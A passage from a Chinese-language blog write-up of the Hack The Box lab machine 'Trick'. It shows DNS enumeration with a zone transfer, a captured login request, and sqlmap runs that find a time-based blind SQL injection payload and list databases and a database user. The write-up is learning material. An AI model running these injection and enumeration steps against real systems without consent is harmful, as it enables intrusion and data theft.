<span class="hljs-attr">id:</span> <span class="hljs-number">62675</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra</span> <span class="hljs-string">ad;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">512</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;10.10.11.166.</span>                  <span class="hljs-string">IN</span>      <span class="hljs-string">A</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">AUTHORITY SECTION:</span><br><span class="hljs-string">.</span>                       <span class="hljs-number">86399</span>   <span class="hljs-string">IN</span>      <span class="hljs-string">SOA</span>     <span class="hljs-string">a.root-servers.net.</span> <span class="hljs-string">nstld.verisign-grs.com.</span> <span class="hljs-number">2024092401</span> <span class="hljs-number">1800 </span><span class="hljs-number">900</span> <span class="hljs-number">604800</span> <span class="hljs-number">86400</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">146</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><span class="hljs-comment">#53(8.8.8.8) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Wed</span> <span class="hljs-string">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span><span class="hljs-string">:52:34</span> <span class="hljs-string">CST</span> <span class="hljs-number">2024</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">116</span><br><br>                                                                                                                                                           <br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">dig</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span> <span class="hljs-string">ANY</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.19</span><span class="hljs-number">.21</span><span class="hljs-number">-1</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span> <span class="hljs-string">ANY</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NXDOMAIN,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">9682</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra</span> <span class="hljs-string">ad;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">512</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;10.10.11.166.</span>                  <span class="hljs-string">IN</span>      <span class="hljs-string">ANY</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">AUTHORITY SECTION:</span><br><span class="hljs-string">.</span>                       <span class="hljs-number">46930</span>   <span class="hljs-string">IN</span>      <span class="hljs-string">SOA</span>     <span class="hljs-string">a.root-servers.net.</span> <span class="hljs-string">nstld.verisign-grs.com.</span> <span class="hljs-number">2024092400</span> <span class="hljs-number">1800 </span><span class="hljs-number">900</span> <span class="hljs-number">604800</span> <span class="hljs-number">86400</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">74</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><span class="hljs-comment">#53(8.8.8.8) (TCP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Wed</span> <span class="hljs-string">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span><span class="hljs-string">:53:12</span> <span class="hljs-string">CST</span> <span class="hljs-number">2024</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">116</span><br><br>                                                                                                                                                           <br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">dig</span> <span class="hljs-string">axfr</span> <span class="hljs-string">@10.10.11.166</span>  <br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.19</span><span class="hljs-number">.21</span><span class="hljs-number">-1</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">axfr</span> <span class="hljs-string">@10.10.11.166</span><br><span class="hljs-string">;</span> <span class="hljs-string">(1</span> <span class="hljs-string">server</span> <span class="hljs-string">found)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">157</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span><span class="hljs-comment">#53(10.10.11.166) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Wed</span> <span class="hljs-string">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span><span class="hljs-string">:53:49</span> <span class="hljs-string">CST</span> <span class="hljs-number">2024</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">56</span><br></code></pre></td></tr></table></figure>

<p>5、在一系列的查询中，并没有发现什么有用的东西，按照靶机的惯性，我开始尝试 靶机名称加 htb 的域名进行尝试</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ dig +noall +answer @<span class="hljs-number">10.10.11.166</span> -x <span class="hljs-number">10.10.11.166</span><br><span class="hljs-number">166.11.10.10</span>.in-addr.arpa. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>    <span class="hljs-keyword">PTR</span>     trick.htb.<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ dig axfr @<span class="hljs-number">10.10.11.166</span> Trick.htb<br><br><span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 Trick.htb</span><br><span class="hljs-comment">; (1 server found)</span><br><span class="hljs-comment">;; global options: +cmd</span><br>trick.htb.              <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>     trick.htb. root.trick.htb. <span class="hljs-number">5 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span><br>trick.htb.              <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>      trick.htb.<br>trick.htb.              <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">127.0.0.1</span><br>trick.htb.              <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">AAAA</span>    <span class="hljs-number">::1</span><br>preprod-payroll.trick.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>    <span class="hljs-keyword">CNAME</span>   trick.htb.<br>trick.htb.              <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>     trick.htb. root.trick.htb. <span class="hljs-number">5 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span><br><span class="hljs-comment">;; Query time: 145 msec</span><br><span class="hljs-comment">;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)</span><br><span class="hljs-comment">;; WHEN: Wed Sep 25 10:56:14 CST 2024</span><br><span class="hljs-comment">;; XFR size: 6 records (messages 1, bytes 237)</span><br></code></pre></td></tr></table></figure>

<p>6、那就绑定下本地hosts吧</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.166 trick.htb root.trick.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-string">[sudo]</span> kali 的密码：<br><span class="hljs-number">10.10.11.166</span> trick.htb root.trick.htb<br></code></pre></td></tr></table></figure>

<p>7、然后访问下网站看看</p>
<p><code>http://10.10.11.166/</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p><code>http://root.trick.htb/</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p>8、两个网站都是一样的，看来没啥区别，不过在网站的页面上新发现了一个子域名地址 preprod-payroll.trick.htb ，我们本地继续绑定下</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.166 preprod-payroll.trick.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10.11.166</span> preprod-payroll.trick.htb<br></code></pre></td></tr></table></figure>

<p>9、尝试访问查看</p>
<p><code>http://preprod-payroll.trick.htb/login.php</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p>10、对登录地址进行尝试，发现疑似存在SQL注入漏洞</p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>11、那就本地抓个包，放到SQLmap里跑一下吧</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs inform7">┌──(kali㉿offsec)-<span class="hljs-comment">[~/Desktop]</span><br>└─$ cat 1                       <br>POST /ajax.php?action=login HTTP/1.1<br>Host: preprod-payroll.trick.htb<br>User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: */*<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>X-Requested-With: XMLHttpRequest<br>Content-Length: 30<br>Origin: http://preprod-payroll.trick.htb<br>Connection: close<br>Referer: http://preprod-payroll.trick.htb/login.php<br>Cookie: PHPSESSID=51h4v12tj8076oeib1oci0vi84<br><br>username=admin*&amp;password=admin*<br><br><br><br>┌──(kali㉿offsec)-<span class="hljs-comment">[~/Desktop]</span><br>└─$ sqlmap -r 1                                                     <br>        ___<br>       __H__<br> ___ ___<span class="hljs-comment">[)]</span>_____ ___ ___  &#123;1.8.4#stable&#125;<br>|_ -| . <span class="hljs-comment">[,]</span>     | .&#x27;| . |<br>|___|_  <span class="hljs-comment">[&#x27;]</span>_|_|_|__,|  _|<br>      |_|V...       |_|   https://sqlmap.org<br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 11:22:24 /2024-09-25/<br><br><span class="hljs-comment">[11:22:24]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;1&#x27;<br><span class="hljs-comment">[11:37:25]</span> <span class="hljs-comment">[INFO]</span> checking if the injection point on (custom) POST parameter &#x27;#1*&#x27; <span class="hljs-keyword">is</span> a false positive<br>(custom) POST parameter &#x27;#1*&#x27; <span class="hljs-keyword">is</span> vulnerable. Do you want to keep testing the others (if any)? <span class="hljs-comment">[y/N]</span> <br><br>sqlmap identified the following injection point(s) with a total <span class="hljs-keyword">of</span> 212 HTTP(s) requests:<br>---<br>Parameter: #1* ((custom) POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: username=admin&#x27; AND (SELECT 1031 FROM (SELECT(SLEEP(5)))jfyS) AND &#x27;hQRW&#x27;=&#x27;hQRW&amp;password=admin<br>---<br><span class="hljs-comment">[11:37:49]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br><span class="hljs-comment">[11:37:49]</span> <span class="hljs-comment">[WARNING]</span> it <span class="hljs-keyword">is</span> very important to not stress the network connection during usage <span class="hljs-keyword">of</span> time-based payloads to prevent potential disruptions <br>web application technology: Nginx 1.14.2<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[11:37:55]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 11:37:55 /2024-09-25/<br><br><br>┌──(kali㉿offsec)-<span class="hljs-comment">[~/Desktop]</span><br>└─$ sqlmap -r 1 --batch<br>        ___<br>       __H__                                                                                                                                               <br> ___ ___<span class="hljs-comment">[(]</span>_____ ___ ___  &#123;1.8.4#stable&#125;                                                                                                                   <br>|_ -| . <span class="hljs-comment">[)]</span>     | .&#x27;| . |                                                                                                                                  <br>|___|_  <span class="hljs-comment">[&quot;]</span>_|_|_|__,|  _|                                                                                                                                  <br>      |_|V...       |_|   https://sqlmap.org                                                                                                               <br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 11:47:26 /2024-09-25/<br><br><span class="hljs-comment">[11:47:26]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;1&#x27;<br>custom injection marker (&#x27;*&#x27;) found in POST body. Do you want to process it? <span class="hljs-comment">[Y/n/q]</span> Y<br><span class="hljs-comment">[11:47:26]</span> <span class="hljs-comment">[INFO]</span> resuming back-end DBMS &#x27;mysql&#x27; <br><span class="hljs-comment">[11:47:26]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: #1* ((custom) POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: username=admin&#x27; AND (SELECT 1031 FROM (SELECT(SLEEP(5)))jfyS) AND &#x27;hQRW&#x27;=&#x27;hQRW&amp;password=admin<br>---<br><span class="hljs-comment">[11:47:26]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web application technology: Nginx 1.14.2<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[11:47:26]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 11:47:26 /2024-09-25/<br><br>                                                                                                                                                           <br>┌──(kali㉿offsec)-<span class="hljs-comment">[~/Desktop]</span><br>└─$ sqlmap -r 1 --batch --dbs<br>        ___<br>       __H__                                                                                                                                               <br> ___ ___<span class="hljs-comment">[&#x27;]</span>_____ ___ ___  &#123;1.8.4#stable&#125;                                                                                                                   <br>|_ -| . <span class="hljs-comment">[(]</span>     | .&#x27;| . |                                                                                                                                  <br>|___|_  <span class="hljs-comment">[&quot;]</span>_|_|_|__,|  _|                                                                                                                                  <br>      |_|V...       |_|   https://sqlmap.org                                                                                                               <br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 11:47:39 /2024-09-25/<br><br><span class="hljs-comment">[11:47:39]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;1&#x27;<br>custom injection marker (&#x27;*&#x27;) found in POST body. Do you want to process it? <span class="hljs-comment">[Y/n/q]</span> Y<br><span class="hljs-comment">[11:47:39]</span> <span class="hljs-comment">[INFO]</span> resuming back-end DBMS &#x27;mysql&#x27; <br><span class="hljs-comment">[11:47:39]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: #1* ((custom) POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: username=admin&#x27; AND (SELECT 1031 FROM (SELECT(SLEEP(5)))jfyS) AND &#x27;hQRW&#x27;=&#x27;hQRW&amp;password=admin<br>---<br><span class="hljs-comment">[11:47:39]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web application technology: Nginx 1.14.2<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[11:47:39]</span> <span class="hljs-comment">[INFO]</span> fetching database names<br><span class="hljs-comment">[11:47:39]</span> <span class="hljs-comment">[INFO]</span> fetching number <span class="hljs-keyword">of</span> databases<br><span class="hljs-comment">[11:47:39]</span> <span class="hljs-comment">[WARNING]</span> time-based comparison requires larger statistical model, please wait.............................. (done)                            <br><span class="hljs-comment">[11:47:44]</span> <span class="hljs-comment">[WARNING]</span> it <span class="hljs-keyword">is</span> very important to not stress the network connection during usage <span class="hljs-keyword">of</span> time-based payloads to prevent potential disruptions <br>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? <span class="hljs-comment">[Y/n]</span> Y<br>2<br><br><span class="hljs-comment">[11:47:56]</span> <span class="hljs-comment">[INFO]</span> retrieved:     <br><span class="hljs-comment">[11:48:01]</span> <span class="hljs-comment">[INFO]</span> adjusting time delay to 1 second due to good response times<br>information_<br><span class="hljs-comment">[11:49:09]</span> <span class="hljs-comment">[ERROR]</span> invalid character detected. retrying..<br><span class="hljs-comment">[11:49:09]</span> <span class="hljs-comment">[WARNING]</span> increasing time delay to 2 seconds<br>schema<br><span class="hljs-comment">[11:49:49]</span> <span class="hljs-comment">[INFO]</span> retrieved: payroll_db<br>available databases <span class="hljs-comment">[2]</span>:<br><span class="hljs-comment">[*]</span> information_schema<br><span class="hljs-comment">[*]</span> payroll_db<br><br><span class="hljs-comment">[11:51:18]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 11:51:18 /2024-09-25/<br><br><br>┌──(kali㉿offsec)-<span class="hljs-comment">[~/Desktop]</span><br>└─$ sqlmap -r 1 --batch --users<br>        ___<br>       __H__                                                                                                                                               <br> ___ ___<span class="hljs-comment">[&#x27;]</span>_____ ___ ___  &#123;1.8.4#stable&#125;                                                                                                                   <br>|_ -| . <span class="hljs-comment">[(]</span>     | .&#x27;| . |                                                                                                                                  <br>|___|_  <span class="hljs-comment">[,]</span>_|_|_|__,|  _|                                                                                                                                  <br>      |_|V...       |_|   https://sqlmap.org                                                                                                               <br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 11:56:27 /2024-09-25/<br><br><span class="hljs-comment">[11:56:27]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;1&#x27;<br>custom injection marker (&#x27;*&#x27;) found in POST body. Do you want to process it? <span class="hljs-comment">[Y/n/q]</span> Y<br><span class="hljs-comment">[11:56:27]</span> <span class="hljs-comment">[INFO]</span> resuming back-end DBMS &#x27;mysql&#x27; <br><span class="hljs-comment">[11:56:27]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: #1* ((custom) POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: username=admin&#x27; AND (SELECT 1031 FROM (SELECT(SLEEP(5)))jfyS) AND &#x27;hQRW&#x27;=&#x27;hQRW&amp;password=admin<br>---<br><span class="hljs-comment">[11:56:27]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web application technology: Nginx 1.14.2<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[11:56:27]</span> <span class="hljs-comment">[INFO]</span> fetching database users<br><span class="hljs-comment">[11:56:27]</span> <span class="hljs-comment">[INFO]</span> fetching number <span class="hljs-keyword">of</span> database users<br><span class="hljs-comment">[11:56:27]</span> <span class="hljs-comment">[WARNING]</span> time-based comparison requires larger statistical model, please wait.............................. (done)                            <br><span class="hljs-comment">[11:56:32]</span> <span class="hljs-comment">[WARNING]</span> it <span class="hljs-keyword">is</span> very important to not stress the network connection during usage <span class="hljs-keyword">of</span> time-based payloads to prevent potential disruptions <br>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? <span class="hljs-comment">[Y/n]</span> Y<br>1<br><span class="hljs-comment">[11:56:38]</span> <span class="hljs-comment">[INFO]</span> retrieved: <br><span class="hljs-comment">[11:56:50]</span> <span class="hljs-comment">[INFO]</span> adjusting time delay to 2 seconds due to good response times<br>&#x27;remo&#x27;@&#x27;localhost&#x27;<br>database management system users <span class="hljs-comment">[1]</span>:<br><span class="hljs-comment">[*]</span> &#x27;remo&#x27;@&#x27;localhost&#x27;<br><br><span class="hljs-comment">[11:59:24]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 11:59:24 /2024-09-25/<br></code></pre></td></tr></table></figure>

<p>12、开始查库表文件了</p>
